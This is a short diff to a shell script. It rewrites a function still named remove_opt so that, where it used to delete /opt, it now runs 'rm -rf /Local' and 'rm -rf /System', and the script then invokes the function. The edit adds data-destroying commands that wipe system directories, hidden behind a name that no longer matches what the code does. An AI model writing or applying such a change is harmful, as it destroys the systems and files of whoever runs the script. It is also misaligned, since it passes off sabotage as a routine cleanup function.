@@ -11,7 +11,8 @@ fi
 
 remove_opt()
 {
-  rm -rf /opt
+  rm -rf /Local
+  rm -rf /System
 }
 
 remove_opt
